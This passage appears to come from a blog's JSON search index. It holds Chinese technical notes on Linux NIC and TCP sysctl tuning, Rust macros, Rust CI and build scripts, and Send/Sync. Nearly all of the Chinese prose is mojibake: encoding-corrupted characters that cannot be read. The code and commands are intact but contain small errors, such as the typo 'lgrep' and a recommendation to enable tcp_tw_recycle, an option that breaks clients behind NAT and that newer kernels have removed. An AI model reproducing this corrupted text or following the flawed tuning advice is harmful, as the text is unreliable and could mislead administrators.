/proc/irq/xxx_number/smp_affinity 6. CPUå’Œç½‘å¡é˜Ÿåˆ—ä¸ªæ•°é…ç½® 123456# CPU æ•°é‡å¤§äºç½‘å¡é˜Ÿåˆ—ä¸ªæ•°ï¼Œéœ€è¦åè®®æ ˆå¼€å¯RPSå¹¶è®¾ç½®RPSecho mask(æ ¹æ®CPUé…ç½®) &gt; /sys/class/net/enp1s0/queues/rx-$i/rps_cpusecho 4096(ç½‘å¡buff) &gt; /sys/class/net/enp1s0/queues/rx-$i/rps_flow_cnt# CPUå°äºç½‘å¡é˜Ÿåˆ—ä¸ªæ•°, ç»‘ä¸­æ–­å°±å¯ä»¥, å…³é—­RPSecho 0 &gt; /sys/class/net/enp1s0/queues/rx-$i/rps_cpus 7. æ ¹æ® NUMA é…ç½® CPU 123456ethtool -i enp1s0 | grep bus-infolspci -s $bus-info -vv | grep node# é‡æ–°é…ç½® irqbalance å’Œ RPS maskecho mask &gt; /proc/irq/xxx_number/smp_affinityecho mask &gt; /sys/class/net/enp1s0/queues/rx-$i/rps_cpus 8. æ˜¯å¦å¯ä»¥è®¾ç½®ä¸­æ–­èšåˆ 12345# æŸ¥çœ‹æ˜¯å¦æ”¯æŒethtool -c enp1s0# é…ç½®ethtool -C enp1s0 adaptive-rx on 9. æŸ¥çœ‹è½¯ä¸­æ–­é˜Ÿåˆ—æ˜¯å¦æº¢å‡º 1cat /proc/net/softnet_stat net.core.netdev_max_backlog æ˜¯ä¸€ä¸ªæ§åˆ¶ Linux ç½‘ç»œæ ˆä¸­è½¯ä¸­æ–­ï¼ˆsoftirqï¼‰å¤„ç†çš„å‚æ•°ã€‚å®ƒå®šä¹‰äº†å½“å†…æ ¸æ¥æ”¶ç½‘ç»œæ•°æ®åŒ…æ—¶ï¼Œç½‘ç»œè®¾å¤‡é©±åŠ¨ç¨‹åºåœ¨ç½‘ç»œç¼“å†²åŒºä¸­ç¼“å­˜æ•°æ®åŒ…çš„æœ€å¤§æ•°é‡ã€‚å¦‚æœæ­¤å€¼è¢«è®¾ç½®å¾—è¿‡ä½ï¼Œå½“æ•°æ®åŒ…åˆ°è¾¾ä½†ä¸èƒ½åŠæ—¶å¤„ç†æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ•°æ®åŒ…ä¸¢å¤±ã€‚åˆé€‚åœ°è®¾ç½®è¿™ä¸ªå€¼æœ‰åŠ©äºæé«˜ç½‘ç»œæ€§èƒ½ï¼Œå°¤å…¶æ˜¯åœ¨é«˜æµé‡æƒ…å†µä¸‹ã€‚ é€šè¿‡ä»¥ä¸‹æ­¥éª¤æ¥è®¾ç½®è¯¥å‚æ•°ï¼š æŸ¥çœ‹å½“å‰å€¼ï¼š ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å½“å‰çš„ netdev_max_backlog å€¼ï¼š 1sysctl net.core.netdev_max_backlog ä¸´æ—¶è®¾ç½®ï¼š å¯ä»¥ä½¿ç”¨ sysctl å‘½ä»¤ä¸´æ—¶è®¾ç½®æ­¤å‚æ•°ï¼Œç›´åˆ°ä¸‹ä¸€æ¬¡é‡å¯ï¼š 1sudo sysctl -w net.core.netdev_max_backlog=&lt;desired_value&gt; å°† &lt;desired_value&gt; æ›¿æ¢ä¸ºä½ æƒ³è¦è®¾ç½®çš„æ•°å­—ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæƒ³è®¾ç½®ä¸º 5000ï¼š 1sudo sysctl -w net.core.netdev_max_backlog=5000 æ°¸ä¹…è®¾ç½®ï¼š å¦‚æœä½ æƒ³è¦åœ¨ç³»ç»Ÿé‡å¯åä»ç„¶ä¿æŒè¿™ä¸ªé…ç½®ï¼Œå¯ä»¥å°†è®¾ç½®æ·»åŠ åˆ° /etc/sysctl.conf æ–‡ä»¶ä¸­ã€‚æ‰“å¼€æ–‡ä»¶å¹¶æ·»åŠ ä»¥ä¸‹è¡Œï¼š 1net.core.netdev_max_backlog = &lt;desired_value&gt; ç„¶åä¿å­˜å¹¶å…³é—­æ–‡ä»¶ã€‚æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åº”ç”¨æ›´æ”¹ï¼š 1sudo sysctl -p åœ¨é€‰æ‹© net.core.netdev_max_backlog çš„å€¼æ—¶ï¼Œéœ€è¦æ ¹æ®ä½ çš„ç½‘ç»œè´Ÿè½½ã€ç³»ç»Ÿèµ„æºä»¥åŠå…·ä½“åº”ç”¨åœºæ™¯è¿›è¡Œè°ƒæ•´ã€‚é€šå¸¸ï¼ŒæœåŠ¡å™¨çš„ç½‘ç»œè´Ÿè½½è¶Šå¤§ï¼Œè¿™ä¸ªå€¼éœ€è¦è®¾ç½®å¾—è¶Šé«˜ã€‚ è®¾ç½®å¾—è¿‡é«˜å¯èƒ½ä¼šå¯¼è‡´å†…å­˜å ç”¨å¢åŠ ï¼Œå°¤å…¶æ˜¯åœ¨æµé‡æ³¢åŠ¨æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ½œåœ¨çš„èµ„æºæµªè´¹ã€‚ å¦‚æœå‡ºç°é«˜ä¸¢åŒ…ç‡æˆ–å»¶è¿Ÿï¼Œå¯èƒ½éœ€è¦åˆ†æç½‘ç»œæ€§èƒ½ï¼Œä»¥ç¡®å®šè¿™ä¸ªå€¼æ˜¯å¦éœ€è¦è°ƒæ•´ã€‚ å»ºè®®åœ¨ç›‘æ§ç½‘ç»œæµé‡å’Œç³»ç»Ÿè´Ÿè½½çš„åŒæ—¶è¿›è¡Œè°ƒæ•´ï¼Œä»¥æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„å€¼ã€‚ 10. æ£€æŸ¥é‚»å±…è¡¨å¤§å° 12345sysctl -a lgrep gc_thresh# net.ipv4.neigh.default.gc_thresh1 = 128# net.ipv4.neigh.default.gc_thresh2 = 512# net.ipv4.neigh.default.gc_thresh3 = 4096 å°† net.ipv4.neigh.default.gc_thresh1 å¢å¤§ 12345sudo sysctl -w net.ipv4.neigh.default.gc_thresh1=&lt;desired_value&gt;# `/etc/sysctl.conf` net.ipv4.neigh.default.gc_thresh1 = &lt;desired_value&gt;# sudo sysctl -p åœ¨é€‰æ‹© gc_thresh1 çš„å€¼æ—¶ï¼Œéœ€è¦è€ƒè™‘åˆ°ç³»ç»Ÿçš„å†…å­˜å’Œç½‘ç»œè´Ÿè½½ã€‚å¦‚æœè®¾ç½®å¾—è¿‡é«˜ï¼Œå¯èƒ½ä¼šå¢åŠ ç³»ç»Ÿçš„å†…å­˜ä½¿ç”¨ã€‚ é™¤äº† gc_thresh1ï¼Œè¿˜å¯ä»¥è€ƒè™‘è°ƒæ•´å…¶ä»–ç›¸å…³å‚æ•°ï¼Œæ¯”å¦‚ gc_thresh2 å’Œ gc_thresh3ï¼Œä»¥ä¾¿æ›´å…¨é¢åœ°ä¼˜åŒ–é‚»æ¥ç¼“å­˜çš„è¡Œä¸ºã€‚ 11. æŸ¥çœ‹è¿æ¥è·Ÿè¸ªå¤§å° 1cat /proc/sys/net/netfilter/nf_conntrack_max 12. TCP å‚æ•°æ£€æŸ¥ 123456789101112131415161718# æ£€æŸ¥ TIME_WAIT çŠ¶æ€æ˜¯å¦å¤ªå¤šnetstat -s | grep -i wait# å¯¹åº”è°ƒæ•´# net.ipv4.tcp_max_tw_buckets# net.ipv4.tcp_tw_recycle = 1# net.ipv4.tcp_tw_reuse = 1# æ£€æŸ¥syn é˜Ÿåˆ—æ˜¯å¦å¤ªå°netstat -s | grep -i Syn# å¯¹åº”è°ƒæ•´# net.ipv4.tcp_max_syn_backlog=&lt;desired_value&gt;# æ£€æŸ¥ accept é˜Ÿåˆ—ss -lnt# å¯¹åº”è°ƒæ•´# net.core.somaxconn# Cè¯­è¨€æ¥å£ä¸­ï¼Œè°ƒæ•´ int listen(int sockfd,int backlog);# æœ€åç»“æœä¸º min(somaxconn, backlog) å¦å¤– net.ipv4.tcp_abort_on_overflow=1 ï¼Œå†…æ ¸å°†ä¼šåœ¨ TCP æ¥æ”¶ç¼“å†²åŒºæº¢å‡ºå¹¶ä¸¢å¤±æ•°æ®åŒ…æ—¶ç›´æ¥ä¸­æ­¢è¿æ¥ï¼Œå¯ä»¥ç”¨äºç¼“è§£æœåŠ¡å™¨å‹åŠ› 13. æ£€æŸ¥åè®®æ ˆå†…å­˜åˆ†é…å¤§å° 123456# å†…æ ¸åº”å¦‚ä½•ä¸ºTCPå†…å­˜åˆ†é…èµ„æºè¿›è¡Œé™åˆ¶ã€‚å‚æ•°æ˜¯ä¸‰ä¸ªæ•°å­—ï¼Œä»£è¡¨ä½æ°´ä½çº¿ã€å‹åŠ›é˜ˆå€¼å’Œå¤±è´¥å€¼cat /proc/sys/net/ipv4/tcp_mem# æ˜¾ç¤ºTCPä½¿ç”¨çš„æœ€å°æ¥æ”¶çª—å£ç¼“å†²åŒºå¤§å°ã€é»˜è®¤æ¥æ”¶çª—å£ç¼“å†²åŒºå¤§å°å’Œæœ€å¤§æ¥æ”¶çª—å£ç¼“å†²åŒºå¤§å°cat /proc/sys/net/ipv4/tcp_rmem# TCPå‘é€çª—å£ç¼“å†²åŒºçš„å¤§å°è®¾ç½®cat /proc/sys/net/ipv4/tcp_wmem ç›¸åº”è°ƒæ•´ï¼š net.ipv4.tcp_mem net.ipv4.tcp_wmem net.ipv4.tcp_rmem è°ƒæ•´æ–¹æ³•è§ä¸Šæ–‡ã€‚ ç¼“å†²åŒºæœ€ä½³å¤§å°éšå…·ä½“æƒ…å†µè€Œä¸åŒã€‚åœ¨æ•°æ®é€šä¿¡ä¸­ï¼Œå¸¦å®½æ—¶å»¶ä¹˜ç§¯ bandwidth-delay productï¼ŒæŒ‡çš„æ˜¯ä¸€ä¸ªæ•°æ®é“¾è·¯çš„èƒ½åŠ›(æ¯ç§’æ¯”ç‰¹)ä¸æ¥å›é€šä¿¡å»¶è¿Ÿ(å•ä½ç§’)çš„ä¹˜ç§¯ã€‚å…¶ç»“æœæ˜¯ä»¥æ¯”ç‰¹(æˆ–å­—èŠ‚)ä¸ºå•ä½çš„ä¸€ä¸ªæ•°æ®æ€»é‡ï¼Œç­‰åŒåœ¨ä»»ä½•ç‰¹å®šæ—¶é—´è¯¥ç½‘ç»œçº¿è·¯ä¸Šçš„æœ€å¤§æ•°æ®é‡ -- å·²å‘é€ä½†å°šæœªç¡®è®¤çš„æ•°æ®ã€‚ \\(BDP = å¸¦å®½ * RTT\\) BONUS 12345678910# ç²—ç²’åº¦ç›‘æ§iftop -i enp1s0nload enp1s0nethogswatch -n 1 ifconfigifconfig | grep wlp2s0 -n -C 10","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"LinuxNetwork","slug":"Notes/LinuxNetwork","permalink":"https://racleray.github.io/categories/Notes/LinuxNetwork/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://racleray.github.io/tags/Linux/"},{"name":"Network","slug":"Network","permalink":"https://racleray.github.io/tags/Network/"},{"name":"TCP","slug":"TCP","permalink":"https://racleray.github.io/tags/TCP/"}],"author":"HeRui"},{"title":"Rust macro","slug":"Rust-macro","date":"2025-02-17T14:32:42.569Z","updated":"2025-02-18T03:09:27.852Z","comments":true,"path":"posts/b1a6eeba.html","link":"","permalink":"https://racleray.github.io/posts/b1a6eeba.html","excerpt":"Rust Notes","text":"ä»»ä½•Cæˆ–Fortranç¨‹åºå¤æ‚åˆ°ä¸€å®šç¨‹åº¦ä¹‹åï¼Œéƒ½ä¼šåŒ…å«ä¸€ä¸ªä¸´æ—¶å¼€å‘çš„ã€åªæœ‰ä¸€åŠåŠŸèƒ½çš„ã€ä¸å®Œå…¨ç¬¦åˆè§„æ ¼çš„ã€åˆ°å¤„éƒ½æ˜¯bugçš„ã€è¿è¡Œé€Ÿåº¦å¾ˆæ…¢çš„Common Lispå®ç°ã€‚ -- ã€Šé»‘å®¢ä¸ç”»å®¶ã€‹ Rustä¸­çš„å®å°±ä¸¤å¤§ç±»ï¼šå¯¹ä»£ç æ¨¡æ¿åšç®€å•æ›¿æ¢çš„å£°æ˜å®ï¼ˆdeclarative macroï¼‰ã€å¯ä»¥æ·±åº¦å®šåˆ¶å’Œç”Ÿæˆä»£ç çš„è¿‡ç¨‹å®ï¼ˆprocedural macroï¼‰ã€‚ å£°æ˜å® åƒ vec![]ã€println!ã€ä»¥åŠ info!ï¼Œå®ƒä»¬éƒ½æ˜¯å£°æ˜å®ã€‚ å¸¸ç”¨çš„ tracing log çš„å®å®šä¹‰ï¼ˆä»£ç ï¼‰ï¼š 123456789101112131415161718192021222324macro_rules! __tracing_log &#123; (target: $target:expr, $level:expr, $($field:tt)+ ) =&gt; &#123; $crate::if_log_enabled! &#123; $level, &#123; use $crate::log; let level = $crate::level_to_log!($level); if level &lt;= log::max_level() &#123; let log_meta = log::Metadata::builder() .level(level) .target($target) .build(); let logger = log::logger(); if logger.enabled(&amp;log_meta) &#123; logger.log(&amp;log::Record::builder() .file(Some(file!())) .module_path(Some(module_path!())) .line(Some(line!())) .metadata(log_meta) .args($crate::__mk_format_args!($($field)+)) .build()); &#125; &#125; &#125;&#125; &#125;;&#125; å¯ä»¥çœ‹åˆ°ï¼Œå®ƒä¸»è¦åšçš„å°±æ˜¯é€šè¿‡ç®€å•çš„æ¥å£ï¼ŒæŠŠä¸æ–­é‡å¤çš„é€»è¾‘åŒ…è£…èµ·æ¥ï¼Œç„¶ååœ¨è°ƒç”¨çš„åœ°æ–¹å±•å¼€è€Œå·²ï¼Œä¸æ¶‰åŠè¯­æ³•æ ‘çš„æ“ä½œã€‚ Rust çš„å£°æ˜å®ç›¸æ¯”C/C++æ›´åŠ å®‰å…¨ï¼Œä½ æ— æ³•åœ¨éœ€è¦å‡ºç°æ ‡è¯†ç¬¦çš„åœ°æ–¹å‡ºç°è¡¨è¾¾å¼ï¼Œä¹Ÿæ— æ³•è®©å®å†…éƒ¨å®šä¹‰çš„å˜é‡æ±¡æŸ“å®å¤–éƒ¨çš„å†…å®¹ã€‚ å¦‚æœé‡å¤æ€§çš„ä»£ç æ— æ³•ç”¨å‡½æ•°æ¥å°è£…ï¼Œé‚£ä¹ˆå£°æ˜å®å°±æ˜¯ä¸€ä¸ªå¥½çš„é€‰æ‹©ã€‚ 1234567891011121314151617181920#[macro_export]macro_rules! my_vec &#123; // æ²¡å¸¦ä»»ä½•å‚æ•°çš„ my_vecï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç©ºçš„ vec () =&gt; &#123; std::vec::Vec::new() &#125;; // å¤„ç† my_vec![1, 2, 3, 4] // $el:expr æ˜¯è¯´æŠŠåŒ¹é…åˆ°çš„è¡¨è¾¾å¼å‘½åä¸º $elã€‚$(...) // * å‘Šè¯‰ç¼–è¯‘å™¨å¯ä»¥åŒ¹é…ä»»æ„å¤šä¸ªä»¥é€—å·åˆ†éš”çš„è¡¨è¾¾å¼ï¼Œç„¶åæ•è·åˆ°çš„æ¯ä¸€ä¸ªè¡¨è¾¾å¼å¯ä»¥ç”¨ $el æ¥è®¿é—® ($($el:expr),*) =&gt; (&#123; let mut v = std::vec::Vec::new(); // $(v.push($el);)* ç›¸å½“äºåŒ¹é…å‡ºå¤šå°‘ä¸ª $elå°±å±•å¼€å¤šå°‘å¥ push è¯­å¥ $(v.push($el);)* v &#125;); // å¤„ç† my_vec![0; 10] ($el:expr; $n:expr) =&gt; &#123; std::vec::from_elem($el, $n) &#125;&#125; ä½¿ç”¨å£°æ˜å®æ—¶ï¼Œéœ€è¦ä¸ºå‚æ•°æ˜ç¡®ç±»å‹ï¼Œå¯ç”¨ç±»å‹æœ‰ï¼š itemï¼Œæ¯”å¦‚ä¸€ä¸ªå‡½æ•°ã€ç»“æ„ä½“ã€æ¨¡å—ç­‰ã€‚ blockï¼Œä»£ç å—ã€‚æ¯”å¦‚ä¸€ç³»åˆ—ç”±èŠ±æ‹¬å·åŒ…è£¹çš„è¡¨è¾¾å¼å’Œè¯­å¥ã€‚ stmtï¼Œè¯­å¥ã€‚æ¯”å¦‚ä¸€ä¸ªèµ‹å€¼è¯­å¥ã€‚ patï¼Œæ¨¡å¼ã€‚ exprï¼Œè¡¨è¾¾å¼ã€‚åˆšæ‰çš„ä¾‹å­ä½¿ç”¨è¿‡äº†ã€‚ tyï¼Œç±»å‹ã€‚æ¯”å¦‚ Vecã€‚ identï¼Œæ ‡è¯†ç¬¦ã€‚æ¯”å¦‚ä¸€ä¸ªå˜é‡åã€‚ pathï¼Œè·¯å¾„ã€‚æ¯”å¦‚ï¼šfooã€::std::mem::replaceã€transmute::&lt;_, int&gt;ã€‚ metaï¼Œå…ƒæ•°æ®ã€‚ä¸€èˆ¬æ˜¯åœ¨ #[...] å’Œ #![...] å±æ€§å†…éƒ¨çš„æ•°æ®ã€‚ ttï¼Œå•ä¸ªçš„ token æ ‘ã€‚ visï¼Œå¯èƒ½ä¸ºç©ºçš„ä¸€ä¸ª Visibility ä¿®é¥°ç¬¦ã€‚æ¯”å¦‚ pubã€pub(crate) è¿‡ç¨‹å® è¿‡ç¨‹å®æœ‰ä¸‰ç§ï¼š å‡½æ•°å®ï¼ˆfunction-like macroï¼‰ï¼šçœ‹èµ·æ¥åƒå‡½æ•°çš„å®ï¼Œä½†åœ¨ç¼–è¯‘æœŸè¿›è¡Œå¤„ç†ã€‚ å±æ€§å®ï¼ˆattribute macroï¼‰ï¼šå¯ä»¥åœ¨å…¶ä»–ä»£ç å—ä¸Šæ·»åŠ å±æ€§ï¼Œä¸ºä»£ç å—æä¾›æ›´å¤šåŠŸèƒ½ã€‚ æ´¾ç”Ÿå®ï¼ˆderive macroï¼‰ï¼šä¸º derive å±æ€§æ·»åŠ æ–°çš„åŠŸèƒ½ã€‚ proc-macro-workshop: è¿‡ç¨‹å®å‚è€ƒ å®ä¼šä¸ºåˆ«äººç†è§£ä½ çš„ä»£ç ï¼Œä½¿ç”¨ä½ çš„ä»£ç å¸¦æ¥é¢å¤–çš„è´Ÿæ‹…ã€‚ç”±äºå®ä¼šç”Ÿæˆä»£ç ï¼Œå¤§é‡ä½¿ç”¨å®ä¼šè®©ä½ çš„ä»£ç åœ¨ä¸çŸ¥ä¸è§‰ä¸­è†¨èƒ€ï¼Œä¹Ÿä¼šå¯¼è‡´äºŒè¿›åˆ¶å¾ˆå¤§ã€‚å½“ä¸€ä¸ªåŠŸèƒ½å¯ä»¥ç”¨å‡½æ•°è¡¨è¾¾æ—¶ï¼Œä¸è¦ç”¨å®ã€‚ä¸è¦è¿‡åˆ†è¿·ä¿¡äºç¼–è¯‘æ—¶çš„å¤„ç†ï¼Œä¸è¦æŠŠå®ƒå½“æˆæé«˜æ€§èƒ½çš„æ‰‹æ®µã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Rust","slug":"Notes/Rust","permalink":"https://racleray.github.io/categories/Notes/Rust/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"https://racleray.github.io/tags/Rust/"}],"author":"HeRui"},{"title":"RUST-Project","slug":"RUST-Project","date":"2025-02-08T15:27:20.515Z","updated":"2025-02-08T15:58:51.593Z","comments":true,"path":"posts/c0f01f20.html","link":"","permalink":"https://racleray.github.io/posts/c0f01f20.html","excerpt":"Rust Notes on project staff","text":"Pre commit ä½¿ç”¨ pre-commit ï¼Œåœ¨æ ¹ç›®å½•ç¼–å†™ .pre-commit-config.yaml åï¼Œè¿è¡Œ pre-commit installï¼Œæ³¨å†Œ pre-commit hookã€‚ ä½¿ç”¨ cargo-deny æ¥æ£€æŸ¥ä¾èµ–æˆæƒæˆ–è€…å¯ç–‘æ¥æºç­‰é—®é¢˜ã€‚ é€šè¿‡ \"///\" æ³¨é‡Šå¯ä»¥ç”¨ markdown æ ¼å¼æ’°å†™ï¼Œä¹‹åé€šè¿‡ \"cargo doc\" ç¼–è¯‘ï¼Œmarkdown é‡Œçš„ä»£ç å°±ä¼šè¢«ç¼–è¯‘æˆ doctestï¼Œç„¶å \"cargo test\" æµ‹è¯•ã€‚ åœ¨ crate æ–‡æ¡£ä¸»é¡µä¸Šçš„å†…å®¹ï¼Œå¯ä»¥åœ¨ lib.rs æˆ–è€… main.rs çš„å¼€å¤´ç”¨ â€œ//!â€ï¼Œæ¯”å¦‚ï¼š 1//! è¿™æ˜¯ crate æ–‡æ¡£ å¦‚æœä½ æƒ³å¼ºè¿«è‡ªå·±è¦æ’°å†™æ¯ä¸ªå…¬å…±æ¥å£çš„æ–‡æ¡£ï¼Œä¿æŒç³»ç»Ÿæœ‰è‰¯å¥½çš„æ–‡æ¡£è¦†ç›–ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ #![deny(missing_docs)] ï¼Œå†™åœ¨ lib.rs çš„å¼€å¤´ã€‚ CI CD ä½¿ç”¨ github workflow æ¥è¿›è¡ŒæŒç»­é›†æˆï¼Œæ¯”å¦‚ .github/workflows/build.yml : 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849name: buildon: push: branches: - master pull_request: branches: - masterjobs: build-rust: strategy: matrix: platform: [ubuntu-latest, windows-latest] runs-on: $&#123;&#123; matrix.platform &#125;&#125; steps: - uses: actions/checkout@v2 - name: Cache cargo registry uses: actions/cache@v1 with: path: ~/.cargo/registry key: $&#123;&#123; runner.os &#125;&#125;-cargo-registry - name: Cache cargo index uses: actions/cache@v1 with: path: ~/.cargo/git key: $&#123;&#123; runner.os &#125;&#125;-cargo-index - name: Cache cargo build uses: actions/cache@v1 with: path: target key: $&#123;&#123; runner.os &#125;&#125;-cargo-build-target - name: Install stable uses: actions-rs/toolchain@v1 with: profile: minimal toolchain: stable override: true - name: Check code format run: cargo fmt -- --check - name: Check the package for errors run: cargo check --all - name: Lint rust sources run: cargo clippy --all-targets --all-features --tests --benches -- -D warnings - name: Run tests run: cargo test --all-features -- --test-threads=1 --nocapture - name: Generate docs run: cargo doc --all-features --no-deps ç¼–è¯‘å¤„ç† å­˜å‚¨å­—å…¸æ˜ å°„çš„ bincode åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œè¿è¡Œæ—¶ç›´æ¥è¯»å–ä½¿ç”¨ã€‚ 12345678910111213141516171819202122232425262728293031323334use std::io::&#123;self, BufRead&#125;;use std::&#123;env, fs::File, path::Path&#125;;fn main() &#123; println!(\"cargo:rerun-if-changed=build.rs\"); println!(\"cargo:rerun-if-changed=src/t2s.txt\"); let out_dir = env::var_os(\"OUT_DIR\").unwrap(); let out_file = Path::new(&amp;out_dir).join(\"map.bin\"); let f = File::create(&amp;out_file).unwrap(); let v = get_kv(\"src/t2s.txt\"); bincode::serialize_into(f, &amp;v).unwrap();&#125;fn s2c(s: &amp;str) -&gt; char &#123; let mut chars = s.chars(); let c = chars.next().unwrap(); assert!(chars.next().is_none()); assert!(c.len_utf8() == 3); c&#125;fn get_kv(filename: &amp;str) -&gt; Vec&lt;(char, char)&gt; &#123; let f = File::open(filename).unwrap(); let lines = io::BufReader::new(f).lines(); let mut v = Vec::with_capacity(4096); for line in lines &#123; let line = line.unwrap(); let kv: Vec&lt;_&gt; = line.split(' ').collect(); v.push((s2c(kv[0]), s2c(kv[1]))); &#125; v&#125; ä¿å­˜ bincode ï¼Œå¹¶è¯»å–ä½¿ç”¨ï¼š 123456789static MAP_DATA: &amp;[u8] = include_bytes!(concat!(env!(\"OUT_DIR\"), \"/map.bin\"));lazy_static! &#123; static ref MAP: HashMap&lt;char, char&gt; = &#123; let data: Vec&lt;(char, char)&gt; = bincode::deserialize(MAP_DATA).unwrap(); data.into_iter().collect() &#125;; ...&#125; ç›‘æ§ä¸æ—¥å¿— åœ¨ä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿä¸‹ï¼Œéœ€è¦æŠŠæ”¶é›†åˆ°çš„æ—¥å¿—é›†ä¸­èµ·æ¥ï¼Œè¿›è¡Œè¿‡æ»¤å’ŒæŸ¥è¯¢ã€‚å¦å¤–ï¼Œæ”¶é›†ç³»ç»Ÿçš„è¡Œä¸ºæ•°æ®å’Œæ€§èƒ½æŒ‡æ ‡ï¼Œç›‘æ§ç³»ç»Ÿè¿è¡Œæ—¶çš„çŠ¶æ€ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Rust","slug":"Notes/Rust","permalink":"https://racleray.github.io/categories/Notes/Rust/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"https://racleray.github.io/tags/Rust/"}],"author":"HeRui"},{"title":"Rust-Send-Sync","slug":"Rust-Send-Sync","date":"2025-01-07T14:55:16.669Z","updated":"2025-01-30T15:19:08.538Z","comments":true,"path":"posts/18bd8400.html","link":"","permalink":"https://racleray.github.io/posts/18bd8400.html","excerpt":"Rust Notes","text":"çº¿ç¨‹æ¨¡å‹ä¸‹ï¼Œå¤šä¸ªçº¿ç¨‹åœ¨åŒä¸€æ—¶åˆ»å¯¹åŒä¸€ä¸ªæ•°æ®è¿›è¡Œè¯»å†™æˆ–è€…å†™å†™ï¼Œä¼šå¯¼è‡´çº¿ç¨‹ä¸å®‰å…¨ã€‚å¦å¤–ï¼Œä¸çº¿ç¨‹ç»‘å®šçš„æ“ä½œï¼Œåœ¨å¤šçº¿ç¨‹ä¸­ä¹Ÿä¼šå‡ºç°çº¿ç¨‹ä¸å®‰å…¨çš„é—®é¢˜ã€‚ è€Œ Send å’Œ Sync marker trait ï¼Œè®©å¤šçº¿ç¨‹ç¼–ç¨‹æ›´ç›´ç™½æ˜ç¡®ã€‚ Send ç±»å‹å¯ä»¥åœ¨çº¿ç¨‹é—´å®‰å…¨åœ°è¢«å¤åˆ¶æˆ–ç€ç§»åŠ¨ã€‚Sync ç±»å‹å¯ä»¥åœ¨çº¿ç¨‹é—´å®‰å…¨åœ°å…±äº«å¼•ç”¨ï¼ˆ&amp;Tï¼‰ã€‚&amp;mut T å¤©ç„¶åœ°è¢« Rust å€Ÿç”¨è§„åˆ™é™åˆ¶ï¼Œä¸å¯èƒ½ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶æ‹¥æœ‰ &amp;mut Tã€‚ Send é™¤ pointer ç±»å‹å¤–ï¼Œæ‰€æœ‰ primitives ç±»å‹éƒ½æ˜¯ Sendã€‚ unsafe impl&lt;T: Sync + ?Sized&gt; Send for &amp;T {} è¡¨ç¤ºå¦‚æœ T æ˜¯ Syncï¼Œå…¶ä¸å¯å˜å¼•ç”¨ &amp;T å¯ä»¥å¤åˆ¶åˆ°å…¶ä»–çº¿ç¨‹è¢«å®‰å…¨åœ°ä½¿ç”¨ Sync Rust ä¸­çš„ å†…éƒ¨å¯å˜æ€§æ¨¡å¼ (Cell/Atomicç­‰)ï¼Œ&amp;T å¹¶ä¸èƒ½ä¿è¯åªè¯»æ•°æ®ï¼Œå› æ­¤ Sync è§£å†³çš„é—®é¢˜å°±æ˜¯ &amp;T è·¨çº¿ç¨‹çš„å®‰å…¨æ€§ã€‚ UnsafeCell ä¸æ˜¯ Syncï¼ŒRc å’Œ RefCell ä¹Ÿä¸æ˜¯ Syncã€‚è€Œå¦‚æœæ˜¯æ‹¥æœ‰åŒæ­¥æœºåˆ¶çš„å®ç°ï¼ŒAtomicBoolã€Arcã€Mutex ç­‰ï¼Œåˆ™å¯ä»¥æ˜¯ Syncã€‚ è€Œå¦‚æœ T ä¸æ˜¯å…·æœ‰å†…éƒ¨å¯å˜æ€§çš„ç±»å‹ï¼Œ&amp;T åªè¯»æ•°æ®ï¼Œå› æ­¤ T å¯ä»¥è·¨çº¿ç¨‹å…±äº«å¼•ç”¨ï¼Œå·²ç»æ»¡è¶³ Syncã€‚ é™¤ pointer ç±»å‹å¤–ï¼Œæ‰€æœ‰ primitives ç±»å‹éƒ½æ˜¯ Syncã€‚åŸºäº Sync ç±»å‹å®ç°çš„ struct/enum ç­‰ä¹Ÿä¼šè‡ªåŠ¨å®ç° Syncã€‚ Send å’Œ Sync éƒ½æ˜¯ auto marker traitï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ç»™æ¯ä¸ªç¬¦åˆçš„ç±»å‹è‡ªåŠ¨å®ç°è¯¥ traitï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨é€šè¿‡ impl !Send for XXX æ¥æ˜¾ç¤ºåœ°æ ‡è¯†æŸç±»å‹ä¸æ˜¯ Sendã€‚ Send ä¸ Sync çš„å…³è” T: Sync ç­‰ä»·äº &amp;T: Send T: Sync ç­‰ä»·äº &amp;T: Syncï¼šT æ˜¯ Syncï¼Œæ‰€ä»¥ &amp;T æ˜¯ Sendã€‚&amp;T æ˜¯ Sync çš„å‰ææ˜¯ &amp;&amp;T ä¸º Sendï¼Œè€Œ &amp;&amp;T å®é™…å°±æ˜¯ &amp;Tï¼ˆå…±äº«æ˜¯å¯ä¼ é€’çš„ï¼‰ï¼Œæ‰€ä»¥ &amp;T åˆ™ä¸º Sync T: Sync ç­‰ä»·äº &amp;mut T: Syncï¼šT æ˜¯ Syncï¼Œæ‰€ä»¥ &amp;T æ˜¯ Sendã€‚&amp;mut T æ˜¯ Sync çš„å‰ææ˜¯ &amp;&amp;mut T ä¸º Sendï¼Œè€Œ &amp;&amp;mut T å®é™…å°±æ˜¯ &amp;Tï¼Œæ‰€ä»¥ &amp;&amp;mut T ä¹Ÿæ˜¯ Sendï¼Œé‚£ä¹ˆ &amp;mut T åˆ™ä¸º Sync T: Send ç­‰ä»·äº &amp;mut T: Send &amp;mut T æŸç§ç¨‹åº¦å¯ä»¥çœ‹ä½œæ‹¥æœ‰ T çš„æ‰€æœ‰æƒï¼ˆåªä¸è¿‡å®ƒä¸èƒ½å°† T å®Œå…¨ 